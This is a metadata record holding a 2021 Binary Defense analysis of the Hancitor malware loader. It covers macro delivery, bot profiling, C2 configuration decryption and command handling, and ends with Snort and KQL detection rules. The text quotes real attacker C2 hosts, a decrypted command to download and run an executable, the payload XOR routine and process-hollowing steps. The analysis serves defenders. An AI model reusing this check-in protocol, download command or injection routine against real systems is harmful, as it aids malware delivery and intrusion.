{
    "id": "1695ba4d-7e93-402d-aced-a470528df774",
    "created_at": "2023-01-12T15:05:58.326073Z",
    "updated_at": "2025-03-27T02:09:18.062708Z",
    "deleted_at": null,
    "sha1_hash": "b9c715967c85e49024e7cc24be36eab5372f0782",
    "title": "2021-06-17 - Analysis of Hancitor – When Boring Begets Beacon",
    "authors": "",
    "file_creation_date": "2022-05-28T01:29:33Z",
    "file_modification_date": "2022-05-28T01:29:33Z",
    "file_size": 5167757,
    "plain_text": "# Analysis of Hancitor – When Boring Begets Beacon\n\n**[binarydefense.com/analysis-of-hancitor-when-boring-begets-beacon](https://www.binarydefense.com/analysis-of-hancitor-when-boring-begets-beacon)**\n\nJune 17, 2021\n\nAuthor: Brandon George\n\n### What is Hancitor?\n\nHancitor is a well-known malware loader that has been observed delivering FickerStealer,\nSendsafe, and Cobalt Strike Beacon if the victim targeting conditions are met. In recent\nmonths, more threat intelligence has been gathered as to what the attackers’ goals are when\n[Hancitor is used to deliver Cobalt Strike Beacon and, based on the information shared, it has](https://blog.group-ib.com/hancitor-cuba-ransomware)\nbecome apparent that the Cuba Ransomware gang has selected Hancitor as its loader of\nchoice. This means that companies of all sizes need to be sure their cyber defense and\ndetection strategies include the capability to detect behaviors associated with Hancitor. Many\nransomware gangs up to this point have chosen Cobalt Strike as their preferred tool to move\nwithin an environment, but few malware loaders drop Beacon as quickly as Hancitor. This\nmeans that time to detection and response is critical for defenders to avoid damage to\nsystems that they protect.\n\n### Acknowledgements\n\nThis study would have not been possible without the help and hard work of James Quinn at\nIntel471, Pim Trouerbach at Nike, and the whole Threat Research team here at Binary\nDefense. Thank you all for the contributions and guidance, the field would be lacking without\n\n\n-----\n\nyour help.\n\n### Hancitor Delivery\n\nHancitor largely relies on Word documents for delivery by embedding the DLL inside of the\ndoc and executing through RunDLL32.exe. When the document opens, the DLL is written to\nvarious places in a user’s AppData directory. In some cases, the DLL is written to\nAppData\\Local\\Temp, in other cases it can be seen being written to in\nAppData\\Local\\Microsoft\\Word or AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup. Regardless of the write location, the macro will use ShellExecuteA\nto launch RunDLL32.exe.\n\nFigure 1. Hancitor document lure\n\n\n-----\n\nFigure 1a. olevba functionality report of Hancitors maldoc\n\n### The Binary\n\nFigure 2. Exported\n\nFunction\nWhen the malicious document launches the DLL via Rundll32, the function referenced will\nonly be seen and executed once the DLL is unpacked. An example of what this particular\nsample would run as in the command line would look like this:\n```\n\"C:\\Windows\\System32\\rundll32.exe\"\nc:\\users\\admin\\appdata\\roaming\\microsoft\\word\\omsh.dll,EUAYKIYBPAX\n\n```\nIn the unpacked binary, two exports (functions created by the malware author) lead to the\nsame location, which is where analysis can start.\n\n\n-----\n\nFigure 2a. Unpacked\n\nBinary Entry Point\nThe first call in the EntryPoint will lead to a call to the main function and the first step of\nHancitor’s lifecycle, the host profiling.\n\n### Host Profiling with Hancitor\n\nFigure 3. Labeled Functions Used for gathering Host Information\n\n\n-----\n\nFigure 4. BotID Function\nTo uniquely identify each victim (bot) system, Hancitor computes a BotID using information\nfrom the hardware and configuration. Hancitor uses the HDD Serial Number (like many other\nmalware families, i.e., Emotet) and enumerates the assigned IP addresses of each network\nadapter (virtual or physical) on the infected device. Hancitor uses these values and converts\nthem to integers and XORs them against one another to generate the final “hash” and serves\nas the BotID. If one monitors the traffic from a bot, the Hash will be labeled as “GUID=”.\n\nFigure 4A. Generate BotID Hash\n\n\n-----\n\nFigure 5. Computer and Account Information Function\nWhile profiling the host, it will get the host’s computer name and the user account in which\nthe process is running. Surprisingly, there are no checks to determine if the user is an\nadministrator or any logic to decide if any alternative actions should be taken if the user is an\nadministrator, as is typically seen in other malware families.\n\nFigure 6. External IP Check\nThe use of api.ipify.org to gather the external IP of the infected host is a pattern seen for a\nlong time and continues to be seen in 2021. Although it is a publicly available service and is\nnot malicious in itself, if the use of api.ipify.org is unusual in an organization’s environment, it\nmay be a valuable query to start threat hunting.\n\n\n-----\n\nFigure 7. Domain Trust Enumeration Function\nHancitor will pull Active Directory Trust information through DsEnumerateDomainTrustsA.\nThe return value from this function call determines whether or not a bot will inject a Cobalt\nStrike Beacon later on. For Beacon injection to take place, the bot has to provide at least one\ndomain in the EXT field listed in the Check-in section to come.\n\nFigure 8. Bitness check function\nAfter checking values in the SystemInfo struct, Hancitor returns the proper PE or shellcode\nfor 32-bit or 64-bit systems.\n\n### Hancitor Bot Configuration\n\nEach bot has an RC4-encrypted configuration built into it that comprises of a campaign ID\nand a couple of URLs that will be beaconed out to when the check-in occurs. The buffer\ncontaining the configuration is typically stored in the .data section, where the key is 8 bytes\n\n\n-----\n\nlong, and the encrypted buffer which contains the configuration is contiguous with the key.\nThe routine goes as follows:\n\n1. Hash the 8 bytes with SHA1\n2. Take the first 5 bytes of the SHA1 digest and note it as the RC4 key\n3. Decrypt the buffer with RC4 and the RC4 Key\n\nThe contents of the .data section of a Hancitor binary can be decrypted easily using\nCyberChef in two steps, shown below.\n\nStep 1: Copy the first eight bytes from the .data section as input to compute the RC4 key:\n\nFigure 9. Creating the RC4 key in CyberChef\nStep 2: Take the key derived in step 1 and RC4 decrypt the remaining bytes of the .data\nsection\n\n\n-----\n\nFigure 10. RC4 Key Decrypting the Data Buffer and the decrypted configuration in\nCyberChef\nThese URLs are the Hancitor C2s which will keep track of what bots have checked in and\ntheir associated environments. Hancitor in the vast majority of cases uses cleartext HTTP\ntraffic and has sparingly used HTTPS.\n\n### The Check-in and Command & Control\n\nOnce the C2 URLs are decrypted, the values are saved to a different buffer to be used later.\n\nIn this case, the infected host will send an HTTP POST request as the check-in with the\ninformation we looked at earlier:\n```\n64Bit Device - GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x64)\n32Bit Device - GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x32)\n\n```\n1. BotID\n2. Malware Build Version\n3. Computer Name + Domain\\Username\n4. External IP\n5. Domain Trust Information\n6. OS Arch information\n\nAn example of what the check-in might look like:\n\n\n-----\n\n```\nPOST /8/forum.php HTTP/1.1\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko\nHost: restanumb.ru\nContent-Length: 131\nCache-Control: no-cache\nGUID=898907862551235750&BUILD=2505_nxat9&INFO=DESKTOP-MN90G9Z @ DESKTOPMN90G9Z\\Phineas&EXT=&IP=REDACTED&TYPE=1&WIN=10.0(x64)\nHTTP/1.1 200 OK\nServer: nginx/1.16.1\nDate: Wed, 26 May 2021 20:48:31 GMT\nContent-Type: text/html\nTransfer-Encoding: chunked\nConnection: keep-alive\nX-Powered-By: PHP/5.4.45\nNTGMARhAEg4OCkBVVRUYDhMIFRRUCA9VTBIJQg8JEx1UHwIfBgc=\n\n```\nWhen the C2 sends the 200 OK, a Base64 encoded string will be sent, and the routine\nfollows these steps:\n\n1. Encoded String\n\n1. NTGMARhAEg4OCkBVVRUYDhMIFRRUCA9VTBIJQg8JEx1UHwIfBgc=\n\nIt should be noted that the C2 sends four extra bytes of extraneous characters to throw a\nwrench in analysis. This can be remediated by slicing off the first four characters of any\nresponse, as seen below.\n\nBase64 without extraneous characters\n\nARhAEg4OCkBVVRUYDhMIFRRUCA9VTBIJQg8JEx1UHwIfBgc=\n\nHex Values\n\n35 31 8c 01 18 40 12 0e 0e 0a 40 55 55 15 18 0e 13 08 15 14 54 08 0f 55 4c 12\n09 42 0f 09 13 1d 54 1f 02 1f 06 07\n\nXOR with 0x7A\nDecrypted Response\n\n{b:http://obtiron.ru/6hs8usig.exe|}\n\nAs mentioned before, the received command tells the bot how and what to start as a new\nprocess. There are only five valid commands Hancitor uses:\n\n“b” – Downloads either a Cobalt Strike Beacon, FickerStealer, or Sendsafe and injects\nit into a new svchost.exe process\n“e” – Downloads either a Cobalt Strike Beacon, FickerStealer, or Sendsafe and injects\nit into the currently running process\n\n\n-----\n\nl – Downloads shellcode and executes in the current process or into svchost\n“n” – Nothing, but it could also serve as a ping if the bot is still active.\n“r”- Similar to the “b” command but includes a check to determine if the downloaded\nimage is a DLL or an exe.\n\nFor commands “b”, “e”, and “ l”, the downloaded payloads are always injected into svchost\nthrough process hollowing. The “r” command is the only command that touches disk by\nwriting the downloaded image to the user’s AppData\\Local\\Temp directory. In all of the cases\nanalyzed, this command has not been used, but Hancitor will generate a .TMP file with the\nprefix “BN” where the rest of the name will be the current computer time as Hancitor always\n[sets a value of 0 in the uUnique parameter of GetFilenameTempA.](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-gettempfilenamea)\n\ne.x. C:\\Users\\Philip\\AppData\\Local\\Temp\\BN19981014234200.TMP\n\nIt can also be represented as a regular expression as well:\nC:\\\\Users\\\\w+\\\\AppData\\\\Local\\\\Temp\\\\BN\\d{7-14}\\.TMP\n\n### Snort Rule\n```\nalert tcp any any -> any $HTTP_PORTS (msg:\"Possible Hancitor Checkin\";\nflow:established,to_server; content:\"POST\"; http_method;content:\"GUID=\";\nhttp_client_body; content:\"&BUILD=\"; http_client_body; content:\"&INFO=\";\nhttp_client_body; content:\"&EXT=\"; http_client_body; content:\"&IP=\";\nhttp_client_body; content:\"&WIN=\"; http_client_body; reference:md5,\n3c3a9a00b60c85c507ece4b4025d0f72; classtype:trojan-activity; sid:210611; rev:1;)\n\n Image Download and Execution\n\n```\nWhen the image is downloaded, it will be encrypted with XOR using a modification of the\npayload bytes as the key and compressed with LZ. The XOR routine is the most complex out\nof all of the encryption methods, but that does not say much as it is still easy to replicate and\nthus decrypt the payload. The routine can be interpreted as followed:\n```\nfor ( i = 8; i < SizeOfImage; ++i ):\nImageData[i] = ImageData[i] ^ ImageData[i mod 8]\n\n```\nOnce the XOR routine is done, the image will be decompressed using LZ through the\nRtlDecompressBuffer function. This function is used for every command except for the “n”\ncommand.\n\n\n-----\n\nFigure 11. Command Table\n“b” Command – Download Image and Inject Into New Svchost Instance\n\n\n-----\n\nFigure 12. downloadImageAndInjectIntoNewSvcHostInstance Function\n\nFigure 12a. injectImageIntoNewSvchostInstance\n\nFigure 12b. InjectImageIntoRemoteProcess\n\n\n-----\n\nMany portions of the injection process are repeated as they all utilize Process Hollowing as\nthe technique of choice, but the distinct feature of the “b” command is its choice to inject into\nsvchost. Process hollowing for Hancitor follows a routine like this:\n\n1. Load the image into a buffer\n2. Start svchost into a suspended state\n3. Get address space of the newly created process\n4. Allocate the address space using VirtualAllocEx for the image to be moved into\n5. Copy image into the new buffer\n6. Use WriteProcessMemory to write the image into the new buffer\n7. Start new thread in svchost\n\n### “e” Command – Download Image and Inject into Current Process\n\nFigure 13. downloadImageAndExecuteWithinCurrentProcess\n\nFigure 13a loadImageIntoCurrentProcessAndExecute\n\n\n-----\n\nWhen the bot receives the command to inject into the currently running process, it will have\nseveral assumptions to work with, including whether or not the downloaded is a DLL or\nrequires a new thread. The routine is relatively straightforward:\n\n1. Download Image (exe)\n2. Check if PE\n3. Allocate memory for image\n4. Allocate memory for new process address\n5. Copy image into the new buffer\n6. Set image base\n7. Set new entry point in the current process\n8. Load import table\n9. Create thread\n\n### “l” command – Download Shellcode and Execute\n\nFigure 14. downloadShellcodeandExecute\nWhile the function says “downloadImage” in this case, it will download shellcode and inject\nthe code into a new process and thread.\n\n\n-----\n\nFigure 14a. executeShellcode\nBecause this command only utilizes shellcode, Hancitor builds in the flexibility for injection\ninto the current process or svchost. If the flag (fRequiresHostProcess) is set to 1, the\nshellcode will be injected into a new svchost process, otherwise the current process is used.\nThis is likely to be seen when a Cobalt Strike Beacon is going to be loaded.\n\n### “r” Command – Write to Disk and Execute\n\nThis command is distinctly different than the rest in that it is the only command that touches\ndisk and does not use process hollowing.\n\nFigure 15. downloadImageAndExecute\nHancitor makes executions rather simple and tolerant to server-side changes by including\noptions to run both DLLs and EXEs which is fitting for the malware it drops.\n\n\n-----\n\nFigure 15. writeTempFileAndExecute\nIn the cases seen, this is not a common option for Hancitor to write a file to disk and leave\nunnecessary evidence behind. There are checks to determine if the downloaded image is a\nDLL or and EXE but regardless, a file with the prefix “BN” with a random name is being\ncreated to the user’s\n\nAppData\\Local\\Temp directory. When the file is written, if the file is a DLL it will be executed\nwith RunDLL32.exe and if the file is an EXE, it will be a normal execution with Hancitor as\nthe parent process.\n\n### Hancitor Detection Opportunities\n\nThere are a number of effective Suricata rules available to detect Hancitor through network\ntraffic, another effective means can occur at the endpoint. Most EDR products can detect\nDNS resolutions and make the connection to the associated process. Filtering and creating\ndetections on this can offer some insight as to what processes might be profiling a system,\nbut should not be considered high fidelity unless paired with better detections. The logic\nwould look something like this in Kusto Query Language (KQL) using Sysmon logs:\n```\nSysmon\n| where EventID == 22\n| where Domain == “api.ipify.org” and ProcessName !in (“chrome.exe”, “iexplore.exe”,\n“firefox.exe”)\n\n```\nAnother simplistic but effective detection can be built on the relationship between Hancitor\nand the downloaded payload. Hancitor has in the recent past only relied on using\nRunDLL32.exe for initial execution which given new information about the command table.\nThree out of the four commands rely on svchost to serve as the child process and the host\nfor process injection. Some EDR products can detect process injection, but all EDR systems\nshould track the parent/child relationship of processes, including svchost. Svchost.exe\nshould rarely ever have a parent that is not services.exe and should never have a parent of\nrundll32.exe. The logic would look something like this in KQL using Sysmon logs and\nCrowdStrike:\n\n\n-----\n\n**KQL**\n```\nSysmon\n| where ProcessName == “svchost.exe” and InitiatingProcessName == “rundll32.exe”\n\n```\n**CrowdStrike Falcon**\n```\nevent_simpleName=ProcessRollup2\n| where ParentBaseFileName=rundll32.exe AND FileName=svchost.exe\n\n```\nFor process hollowing, CrowdStrike offers a valuable collection of logs to help figure out what\nprocesses might be acting suspiciously. Most of the time, this can be easily filtered as the\nnumber of results should be minimal:\n```\nevent_simpleName=ProcessInjection \n| search DetectName=RemotePivotHollowing\n| join TargetProcessId_decimal \n  [search event_simpleName=ProcessRollup2\n  | search FileName=RunDLL32.exe]\n\n```\nLastly, detections based on the “r” command is rather straightforward and can be easy to\nrespond to using Sysmon and KQL:\n\n**KQL:**\n```\nSysmon\n| where EvendID == 11\n| where InitiatingProcessName == “rundll32.exe” and FileName contains “BN” and\nFilePath has “AppData\\\\Local\\\\Temp”\n\n```\n**CrowdStrike:**\n```\nevent_simpleName=PeFileWritten FilePath=*AppData\\\\Local\\\\Temp\\\\\n| rename ContextProcessId_decimal as TargetProcessId_decimal\n| rename FileName as FileWritten\n| rename FilePath as PathWrittenTo\n| join TargetProcessId_decimal\n  [search event_simpleName=ProcessRollup2 FileName=Rundll32.exe]\n| table FileName, FileWritten, PathWrittenTo, MD5HashData\n\n### Binary Defense MDR Detection of Hancitor\n\n```\nThe latest version of Hancitor was tested on a Windows 10 endpoint running Binary\nDefense’s Managed Detection and Response (MDR) software. Using its behavior-based\ndetection approach, MDR detected the execution of Hancitor as a suspicious process with\nnetwork connections and raised an alarm containing all the details of the process and the IP\naddresses it connected to. The Binary Defense Security Operations Task Force monitors\nthose alarms 24 hours a day for clients and would have investigated the event and notified\nthe security or IT team at any client. If no IT personnel were available to respond right away,\n\n\n-----\n\nor if the situation dictated an urgent response, the Analyst at Binary Defense would be able\nto contain the infected host and cut off its outside network communication in time to stop\nattackers from advancing the intrusion with Cobalt Strike Beacon.\n\n## Summary\n\nHancitor might be one of the most straightforward and simplistic loaders currently on the\nmarket compared to big game players like Qakbot, Trickbot, and IcedID. However, none of\nthe other malware families mentioned move as quickly as Hancitor does to drop a Cobalt\nStrike Beacon onto a host. So far, Hancitor has targeted companies of all sizes and in a wide\nvariety of industries and countries to deliver Cobalt Strike Beacon and eventually result in\nransomware, making it a serious threat that defenders and threat hunters must be aware of.\nHancitor is flexible enough to quickly deliver other malware threats in the same way that it\ncurrently loads FlickerStealer and Cobalt Strike. One thing is sure: as effective as it has been\nto date, the threat posed by Hancitor is not going away any time soon.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-06-17 - Analysis of Hancitor – When Boring Begets Beacon.pdf"
    ],
    "report_names": [
        "2021-06-17 - Analysis of Hancitor – When Boring Begets Beacon.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535958,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653701373,
    "ts_modification_date": 1653701373,
    "files": {
        "pdf": "https://archive.orkl.eu/b9c715967c85e49024e7cc24be36eab5372f0782.pdf",
        "text": "https://archive.orkl.eu/b9c715967c85e49024e7cc24be36eab5372f0782.txt",
        "img": "https://archive.orkl.eu/b9c715967c85e49024e7cc24be36eab5372f0782.jpg"
    }
}